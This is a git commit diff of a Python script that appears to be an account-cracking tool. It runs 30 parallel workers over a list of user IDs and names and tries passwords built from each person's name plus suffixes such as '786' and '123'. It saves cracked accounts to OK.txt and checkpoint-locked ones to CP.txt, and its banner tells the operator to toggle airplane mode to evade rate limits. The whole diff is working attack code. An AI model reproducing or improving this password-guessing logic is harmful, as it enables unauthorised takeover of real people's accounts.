a1f2269406b4535294087fdf0fadfa5c47c14e30
Ch Tabish <153706642+tabish3301@users.noreply.github.com>
2023-12-25 08:11:28 +0500

    Add files via upload

--- ch.py
+++ ch.py
@@ -267,18 +267,18 @@ def name():
 				pass
 def name2():
 	clear()
-	print(logo);print( '\n [✓] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [X] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n 📵 \033[1;97mTurn Airplane Mode✈️On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [✓] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [X] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n  📵 \033[1;97m Turn Airplane Mode✈️On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['07867860']
+			pwv = ['445566']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
 				else:
-					pwv.append(first786)
-					pwv.append(first123)
+					pwv.append(frs+'786')
+					pwv.append(frs+'123')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
